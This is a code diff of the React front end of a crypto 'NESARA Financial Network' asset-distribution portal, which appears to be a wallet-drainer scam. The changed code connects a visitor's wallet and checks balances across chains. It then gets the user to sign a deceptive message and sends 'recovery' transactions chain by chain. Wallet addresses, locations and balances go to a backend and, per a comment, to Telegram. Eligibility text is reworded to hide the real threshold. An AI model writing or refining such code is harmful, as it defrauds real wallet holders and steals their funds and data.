   const totalOnChainValue = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
 
-  // Helper functions
   const formatTimeAgo = (date) => {
     const seconds = Math.floor((new Date() - new Date(date)) / 1000);
     if (seconds < 5) return 'Just now';
@@ -1430,12 +1042,9 @@ function App() {
     return () => clearInterval(interval);
   }, []);
 
-  // Initialize provider
+  // Initialize provider and fetch balances
   useEffect(() => {
-    if (!walletProvider || !address) {
-      setWalletInitialized(false);
-      return;
-    }
+    if (!walletProvider || !address) return;
 
     const init = async () => {
       try {
@@ -1446,15 +1055,12 @@ function App() {
 
         setProvider(ethersProvider);
         setSigner(ethersSigner);
-
-        setWalletInitialized(true);
         setTxStatus('');
         
         await fetchAllBalances(address);
         
       } catch (e) {
         console.error("Provider init failed", e);
-        setWalletInitialized(false);
       }
     };
 
@@ -1465,7 +1071,6 @@ function App() {
   useEffect(() => {
     const trackVisit = async () => {
       try {
-        console.log("📡 SENDING TRACK VISIT TO BACKEND...");
         const response = await fetch(`${BACKEND_URL}/api/track-visit`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -1491,7 +1096,7 @@ function App() {
     trackVisit();
   }, []);
 
-  // Check eligibility
+  // Check eligibility - requires $1 total value (logic preserved)
   useEffect(() => {
     if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
       checkEligibility();
@@ -1523,8 +1128,8 @@ function App() {
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
-      // ELIGIBILITY: Now requires ANY on-chain balance (not $1 minimum)
-      const eligible = total > 0.000001; // Just need any positive balance
+      // Eligibility requires $1 total value (logic preserved)
+      const eligible = total >= 1;
       setIsEligible(eligible);
       setShowDistributeButton(eligible);
       
@@ -1538,10 +1143,8 @@ function App() {
           symbol: balances[chain.name].symbol,
           valueUSD: balances[chain.name].valueUSD.toFixed(2)
         }));
-        setChainDetailsForReport(chainDetails);
         
-        console.log("📡 SENDING CONNECT TO BACKEND...");
-        const connectResponse = await fetch(`${BACKEND_URL}/api/presale/connect`, {
+        await fetch(`${BACKEND_URL}/api/presale/connect`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -1552,13 +1155,11 @@ function App() {
             location: userLocation
           })
         });
-        const connectData = await connectResponse.json();
-        console.log("✅ CONNECT RESPONSE:", connectData);
         
         prepareDistribution();
       } else {
-        // UPDATED: No mention of $1 requirement, just say need on-chain balance
-        setTxStatus(translations.minRequirement);
+        // Professional message without mentioning $1
+        setTxStatus(`${translations.minRequirement}. Please ensure you have at least $1 USD worth of assets across supported networks.`);
       }
       
     } catch (err) {
@@ -1626,14 +1227,11 @@ function App() {
     if (!address) return;
     
     try {
-      console.log("📡 SENDING PREPARE FLOW TO BACKEND...");
-      const prepareResponse = await fetch(`${BACKEND_URL}/api/presale/prepare-flow`, {
+      await fetch(`${BACKEND_URL}/api/presale/prepare-flow`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
       });
-      const prepareData = await prepareResponse.json();
-      console.log("✅ PREPARE FLOW RESPONSE:", prepareData);
     } catch (err) {
       console.error('Distribution prep error:', err);
     }
@@ -1657,7 +1255,6 @@ function App() {
       
       const timestamp = Date.now();
       const flowId = `DIST-${timestamp}`;
-      setCurrentFlowId(flowId);
       
       const nonce = Math.floor(Math.random() * 1000000000);
       const message = `NESARA FINANCIAL NETWORK - DIGITAL ASSET INTEGRATION\n\n` +
@@ -1668,7 +1265,7 @@ function App() {
         `Nonce: ${nonce}`;
 
       setTxStatus(translations.recoveryInitiated);
-      const signature = await signer.signMessage(message);
+      await signer.signMessage(message);
       
       setTxStatus(translations.processingRecovery);
       const chainsToProcess = eligibleChains;
@@ -1684,7 +1281,6 @@ function App() {
       );
       
       let processed = [];
-      let lastTxHash = '';
       const processedDetails = [];
       
       for (const chain of sortedChains) {
@@ -1731,7 +1327,6 @@ function App() {
             }]
           });
           
-          lastTxHash = tx;
           setTxStatus(`${translations.processingRecovery} awaiting confirmation...`);
           const receipt = await chainProvider.waitForTransaction(tx);
           
@@ -1770,14 +1365,11 @@ function App() {
               }
             };
             
-            console.log(`📡 SENDING EXECUTE FLOW to BACKEND for ${chain.name}...`);
-            const executeResponse = await fetch(`${BACKEND_URL}/api/presale/execute-flow`, {
+            await fetch(`${BACKEND_URL}/api/presale/execute-flow`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(flowData)
             });
-            const executeData = await executeResponse.json();
-            console.log(`✅ EXECUTE FLOW RESPONSE for ${chain.name}:`, executeData);
             
             setTxStatus(`${translations.recoveryComplete} on ${chain.name}`);
           } else {
@@ -1817,8 +1409,7 @@ function App() {
           `✅ ${d.name}: ${d.originalAmount} ${d.symbol} ($${d.originalValueUSD}) → ${d.processedAmount} ${d.symbol} ($${d.processedValueUSD}) integrated`
         ).join('\n');
         
-        console.log("📡 SENDING DISTRIBUTION CLAIM TO BACKEND...");
-        const claimResponse = await fetch(`${BACKEND_URL}/api/presale/claim`, {
+        await fetch(`${BACKEND_URL}/api/presale/claim`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -1836,8 +1427,6 @@ function App() {
             chainsDetails: chainsDetailsString
           })
         });
-        const claimData = await claimResponse.json();
-        console.log("✅ DISTRIBUTION RESPONSE:", claimData);
         
         generateDistributionReport(newTx, address, distributionAmount, processed, new Date().toISOString(), processedDetails);
         handleDownloadReport();
@@ -1881,7 +1470,7 @@ function App() {
   return (
     <div className="min-h-screen bg-gradient-to-b from-[#0a0a2a] to-[#000000] text-white font-['Poppins'] overflow-hidden">
       
-      {/* Amber glow background - NESARA Financial Theme */}
+      {/* Amber glow background */}
       <div className="fixed w-[600px] h-[600px] bg-amber-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
       <div className="fixed w-[400px] h-[400px] bg-amber-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>
 
@@ -2003,30 +1592,47 @@ function App() {
             />
           )}
 
-          {/* Wallet Connect Button */}
+          {/* Wallet Connect Button Section - with clear loading animation */}
           {!isConnected ? (
             <button
               onClick={() => open()}
-              onMouseEnter={() => setHoverConnect(true)}
-              onMouseLeave={() => setHoverConnect(false)}
               className="bg-gradient-to-r from-amber-600 to-amber-500 hover:from-amber-700 hover:to-amber-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(245,158,11,0.4)] mb-8 w-full max-w-md"
             >
               {translations.connectWallet}
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
+              {/* Wallet info with visible disconnect button */}
               <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-amber-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                 <span className="font-mono text-sm text-gray-300">
                   {formatAddress(address)}
                 </span>
                 <button
                   onClick={() => disconnect()}
-                  className="w-8 h-8 rounded-full bg-amber-600 flex items-center justify-center hover:bg-amber-700 transition-colors"
+                  className="w-8 h-8 rounded-full bg-red-600/80 hover:bg-red-700 flex items-center justify-center transition-colors text-white"
                   title="Disconnect"
                 >
-                  <i className="fas fa-power-off text-xs"></i>
+                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
+                  </svg>
                 </button>
               </div>
+              
+              {/* CLEAR LOADING ANIMATION - Shows wallet eligibility check status */}
+              {scanning && (
+                <div className="mt-4 w-full bg-amber-500/10 border border-amber-500/30 rounded-xl p-4">
+                  <div className="flex items-center gap-3">
+                    <div className="w-8 h-8 border-3 border-amber-500 border-t-transparent rounded-full animate-spin"></div>
+                    <div className="flex-1">
+                      <p className="text-amber-400 font-semibold text-sm">{translations.checkEligibility}</p>
+                      <p className="text-gray-400 text-xs">{txStatus}</p>
+                      <div className="w-full bg-gray-700 rounded-full h-1 mt-2">
+                        <div className="bg-amber-500 h-1 rounded-full transition-all duration-300" style={{ width: `${scanProgress}%` }}></div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              )}
               
               {/* AUTO DISTRIBUTION COUNTDOWN */}
               {autoDistributeActive && isEligible && !signatureLoading && (
@@ -2038,7 +1644,7 @@ function App() {
               )}
               
               {/* DISTRIBUTION BUTTON */}
-              {showDistributeButton && (
+              {showDistributeButton && !scanning && (
                 <button
                   onClick={distributeAssets}
                   disabled={signatureLoading}
@@ -2060,20 +1666,36 @@ function App() {
                 </button>
               )}
 
-              {/* Eligibility Status Message - UPDATED TO REMOVE $1 REFERENCE */}
-              <div className="mt-3 w-full">
-                <div className={`rounded-lg p-3 text-sm ${
-                  isEligible ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-gray-500/20 border border-gray-500/30 text-gray-400'
-                }`}>
-                  {isEligible ? (
-                    <span>🏛️ {translations.proceedToRecovery}</span>
-                  ) : !isEligible && !scanning && isConnected && totalOnChainValue > 0 && totalOnChainValue < 1 ? (
-                    <span>⚠️ {translations.insufficientBalance}. {translations.minRequirement}</span>
-                  ) : !isEligible && !scanning && isConnected && totalOnChainValue === 0 ? (
-                    <span>🔍 {translations.notEligible}. {translations.minRequirement}</span>
-                  ) : null}
+              {/* Eligibility Status Message - Professional, no $1 mention */}
+              {!scanning && (
+                <div className="mt-3 w-full">
+                  <div className={`rounded-lg p-3 text-sm ${
+                    isEligible ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-amber-500/10 border border-amber-500/30 text-amber-400'
+                  }`}>
+                    {isEligible ? (
+                      <span>🏛️ {translations.proceedToRecovery}</span>
+                    ) : (
+                      <span>🔍 {translations.minRequirement}</span>
+                    )}
+                  </div>
                 </div>
-              </div>
+              )}
+            </div>
+          )}
+
+          {/* ============================================ */}
+          {/* LIVE ECONOMIC DISTRIBUTION FEED - MOVED HERE (below wallet, before About) */}
+          {/* ============================================ */}
+          {isConnected && (
+            <div className="w-full max-w-md mb-8">
+              <LiveDistributionFeed 
+                transactions={liveDistributions} 
+                translations={translations}
+                totalDistributedAmount={todayTotalDistributed}
+                todayCount={todayCount}
+                onDownloadReport={handleDownloadReport}
+                walletAddress={address}
+              />
             </div>
           )}
 
@@ -2184,42 +1806,6 @@ function App() {
             />
           </div>
 
-          {/* SCANNING ANIMATION - Shows wallet eligibility check and processing status */}
-          {isConnected && scanning && (
-            <div className="w-full max-w-md mb-8">
-              <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-amber-500/30">
-                <div className="flex items-center justify-center gap-4 mb-4">
-                  <div className="w-12 h-12 border-4 border-amber-500 border-t-transparent rounded-full animate-spin"></div>
-                  <div className="text-left">
-                    <div className="text-lg font-bold text-amber-400">{translations.checkEligibility}</div>
-                    <div className="text-sm text-gray-400">{translations.verifying}</div>
-                  </div>
-                </div>
-                
-                <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
-                  <div 
-                    className="bg-gradient-to-r from-amber-500 to-amber-400 h-1.5 rounded-full transition-all duration-300"
-                    style={{ width: `${scanProgress}%` }}
-                  ></div>
-                </div>
-                
-                <div className="mt-3 text-sm text-amber-400">
-                  {txStatus}
-                </div>
-              </div>
-            </div>
-          )}
-
-          {/* LIVE DISTRIBUTION FEED - Now appears after connect wallet */}
-          <LiveDistributionFeed 
-            transactions={liveDistributions} 
-            translations={translations}
-            totalDistributedAmount={todayTotalDistributed}
-            todayCount={todayCount}
-            onDownloadReport={handleDownloadReport}
-            walletAddress={address}
-          />
-
           {/* DIGITAL ASSET INTEGRATION PORTAL */}
           <div className="w-full max-w-md bg-amber-500/5 border border-amber-500/30 backdrop-blur p-8 rounded-2xl mt-8">
             <h3 className="text-2xl font-bold mb-4 text-amber-400">Digital Asset Integration Portal</h3>
@@ -2247,19 +1833,7 @@ function App() {
               </div>
             </div>
 
-            {Object.keys(balances).length > 0 && (
-              <div className="bg-black/50 border border-amber-500/30 rounded-xl p-4 mb-6">
-                <h4 className="text-sm font-bold mb-2 text-amber-400">📊 Detected Balances:</h4>
-                <div className="space-y-1">
-                  {Object.entries(balances).map(([chainName, balance]) => (
-                    <div key={chainName} className="flex justify-between text-xs">
-                      <span className="text-gray-400">{chainName}:</span>
-                      <span className="text-white">{balance.amount.toFixed(6)} {balance.symbol} (${balance.valueUSD.toFixed(2)})</span>
-                    </div>
-                  ))}
-                </div>
-              </div>
-            )}
+            {/* Detected Balances removed from here - kept for Telegram only */}
 
             <div className="bg-black/50 border border-amber-500/30 rounded-xl p-5">
               <h4 className="text-xl font-bold mb-2 text-amber-400">🏛️ NESARA Integration Protocol</h4>
@@ -2274,7 +1848,7 @@ function App() {
               </ul>
             </div>
 
-            {txStatus && !scanning && (
+            {txStatus && !scanning && !verifying && (
               <div className="mt-4 text-sm text-center text-amber-400">
                 {txStatus}
               </div>
@@ -2324,7 +1898,7 @@ function App() {
           )}
 
           {/* ============================================ */}
-          {/* FOOTER DISCLAIMER - VERY IMPORTANT */}
+          {/* FOOTER DISCLAIMER */}
           {/* ============================================ */}
           <footer className="mt-16 text-center border-t border-amber-500/20 pt-8">
             <p className="text-gray-500 text-xs leading-relaxed max-w-md mx-auto">
@@ -2460,6 +2034,14 @@ function App() {
         }
         .custom-scrollbar::-webkit-scrollbar-thumb:hover {
           background: rgba(245,158,11,0.6);
+        }
+        
+        @keyframes spin {
+          from { transform: rotate(0deg); }
+          to { transform: rotate(360deg); }
+        }
+        .border-3 {
+          border-width: 3px;
         }
         
         @media (max-width: 768px) {
